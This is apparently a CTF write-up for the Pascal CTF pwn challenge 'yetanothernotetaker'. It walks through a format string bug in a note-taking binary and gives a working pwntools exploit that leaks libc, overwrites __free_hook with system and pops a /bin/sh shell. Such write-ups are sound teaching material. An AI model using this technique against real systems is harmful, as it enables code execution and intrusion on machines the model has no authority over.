---
layout: post
title: Pascal CTF - yetanothernotetaker
description:
date: 2026-02-01
categories:
  - writeup
  - pwn
tags:
---
# YET ANOTHER NOTE TAKER

## About the binary

The binary

```sh
t1b4n3@debian:~/ctf/pascalctf/yetanothernotetaker/challenge$ file notetaker
notetaker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./libs/ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=768a7bc2d2918ceb196b57bfa9528681820eae43, not stripped
```

The binary is a elf 64 bit executable, and it is not stripped which makes reversing a lot easier.

```sh
t1b4n3@debian:~/ctf/pascalctf/yetanothernotetaker/challenge$ pwn checksec notetaker
[*] '/home/t1b4n3/ctf/pascalctf/yetanothernotetaker/challenge/notetaker'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    b'./libs/'
```

All mitigations are turned on except **PIE**

## Reversing and Vulnerability Discovery


`main()`
```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    init();
    char notes[0x108];
    memset(&notes, 0, 0x100);
    int32_t i;
    
    do
    {
        menu();
        char* cmd = malloc(0x10);
        memset(cmd, 0, 0x10);
        fgets(cmd, 0x10, stdin);
        __isoc99_sscanf(cmd, "%d", &i);
        free(cmd);
        int32_t choice = i;
        
        if (choice == 2)
        {
            printf("Enter the note: ");
            read(0, &notes, 0x100);
            notes[strcspn(&notes, u"\n…")] = 0;
        }
        else if (choice == 3)
        {
            memset(&notes, 0, 0x100);
            puts("Note cleared.");
        }
        else if (choice == 1)
        {
            printf(&notes);
            putchar(0xa);
        }
        
        if (i <= 0)
            break;
    } while (i <= 4);
    
    if (rax == *(uint64_t*)((char*)fsbase + 0x28))
        return 0;
    
    __stack_chk_fail();
    /* no return */
}
```

This function defines a **note** buffer that is `0x108` which will store our note. The program uses a heap chunk to get the user's choice (This will be important later).

Choices

```sh
./notetaker 
1. Read note
2. Write note
3. Clear note
4. Exit
> 
```

- Option 1 prints the note to stdout and has a **FORMAT STRING** vulnerability.
- Option 2 Gets Input from stdin
- Option 3 Clears the note buffer

## Exploitation.

**Strategy**: Use the format string read vulnerability to leak a libc address and calculate the offset of the libc base address. Then use the format string write vulnerability again to overwrite the free hook and free a chunk that has the string `/bin/sh`.


Lets use the format string read to leak a libc address.


![Format string read](/assets/images/writeups/pascalctf/fmt_str_read.png)

The first address that is leaked is: `0x7ffff7bc4b28`, we can use this to get the libc base address.

![Calculate Libc Base Addr](/assets/images/writeups/pascalctf/calc_libc_base.png)

```python
libc = 0x00007ffff7800000
leak = 0x7ffff7bc4b28
print(hex(leak - libc)) # 0x3c4b28
```


```python
n.write(b"%p")
leak = n.read()
leak = int(leak, 16)
libc.address = leak - 0x3c4b28
```

Now we can use the format string vulnerability to overwrite the free hook (`libc.sym.__free_hook`). 


```python
format_str = 8 
# fmtstr_payload(offset, {where:what}) 
p = fmtstr_payload(format_str, {libc.sym.__free_hook:libc.sym.system}) # 

# Trigger vuln
n.write(p)
n.read()
```

Now that we have overwritten the free hook with `system()`

![free hook overwritten.](/assets/images/writeups/pascalctf/overwite.png)

So to execute any command we just have place the command inside a heap chunk than free it.

```c
char* cmd = malloc(0x10);
memset(cmd, 0, 0x10);
fgets(cmd, 0x10, stdin);
__isoc99_sscanf(cmd, "%d", &i);
free(cmd);
```

So we just have to enter out cmd when the program tries to get a option.

```python
sla(b"> ", b"/bin/sh")
```

This will now pop a shell.

![free hook overwritten.](/assets/images/writeups/pascalctf/shell.png)

```python
class NoteTaker:
    def __init__(self):
        pass

    def read(self):
        sla(b"> ", b"1")
        data = rl()
        return data

    def write(self, data):
        sla(b"> ", b"2")
        sla(b"Enter the note: ", data)

    def clear(self):
        sla(b"> ", b"3")



def exploit():
    ##################################################################### 
    ######################## EXPLOIT CODE ###############################
    #####################################################################
    n = NoteTaker()
    n.write(b"%p")
    leak = n.read()

    leak = int(leak, 16)
    libc.address = leak - 0x3c4b28

    print_leak("libc", libc.address)
    
    format_str = 8

    p = fmtstr_payload(format_str, {libc.sym.__free_hook:libc.sym.system})
    
    n.write(p)
    n.read()
    sla(b"> ", b"/bin/sh")

```


[FULL SCRIPT]()

